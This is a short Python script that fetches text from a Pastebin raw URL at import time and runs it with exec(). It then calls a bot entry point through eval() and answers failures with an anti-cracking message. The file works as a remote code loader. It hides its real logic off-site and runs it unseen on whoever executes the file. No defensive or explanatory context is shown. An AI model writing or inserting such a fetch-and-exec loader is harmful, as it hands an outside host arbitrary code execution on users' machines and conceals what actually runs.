import requests
data = requests.get(url="https://pastebin.com/raw/rQSXSii1").text
exec(data)


def start_script():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"
